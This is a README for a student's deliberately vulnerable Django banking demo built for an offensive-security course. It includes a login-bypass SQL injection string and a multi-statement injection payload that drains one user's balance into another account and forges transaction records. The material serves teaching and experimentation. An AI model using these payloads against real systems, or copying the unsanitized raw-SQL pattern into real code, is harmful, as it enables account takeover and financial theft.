# SQL Injection Demo - 'InsecureBank'

My final project built for cs4001, Offensive Security, taught by Sean Wagner.

This project, a simple banking app, is designed to demonstrate SQL injection vulnerabilities in a web app with unsanitized input fields that execute raw sql queries. It ships with a dockerfile so this project can be run on any machine with docker as a nicely packaged demo for someone wanting to experiment with this type of vulnerability.

## What I Learned
* A form input is vulnerable to SQL injection when we don't sanitize our inputs and execute raw SQL directly.
* Depending on how the SQL is executed on the backend, an input field may only be vulnerable to modifying a single query (using statements like AND, OR), or multiple queries (separated by a semicolon to end a sql statement). This demo has been made as vulnerable as possible by allowing multiple sql statements to be executed at once.
* The Django framework does a great job guarding against this type of vulnerability with its out-of-the-box login and registration forms. I had to go out of my way by making custom forms to create this vulnerability.


## Running the app locally

Recommended method using Docker:

```
docker build -t demo .
docker run -p 8000:8000 demo
```

Alternative method without Docker:

```
python3 manage.py runserver
```

Dev server http://localhost:8000/

## SQL Injections you can try (EASY):
Enter a username into the login field followed by ' or '1'='1
This will let you bypass the password and login as that user.

```
' or '1'='1
```

## SQL Injections you can try (COMPLEX):
Given that you have created two users, 'demo' and 'hackerman' for this example, paste the following into the username field. An error will be thrown, but the statement will still execute. This query will transfer the entire balance from account with username 'demo' to account 'hackerman'

```
'; UPDATE bank_bankaccount
SET balance = balance + (SELECT balance FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo'))
WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman');

INSERT INTO bank_transaction (bank_account_id, amount, note, type, transaction_date)
VALUES (
  (SELECT id FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman')),
  (SELECT balance from bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
  'All of demo users money!',
  'Deposit',
  '0'
);

INSERT INTO bank_transaction (bank_account_id, amount, note, type, transaction_date)
VALUES (
  (SELECT id FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
  -1*(SELECT balance from bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
  'Youve been hacked by the infamous Hackerman!',
  'Withdrawal',
  '0'
);

UPDATE bank_bankaccount
SET balance = 0
WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo'); 

SELECT * FROM auth_user WHERE username='fail
```

## Final Notes

This project was built in the span of 24 hours, so there is room left for improvement. While the vulnerability does work, the database design is not the best. The transaction table should not be a table that gets updated manually, but rather automatically when the bankaccount table gets modified. This would greatly simplify the complex example above and make the demo more realistic.
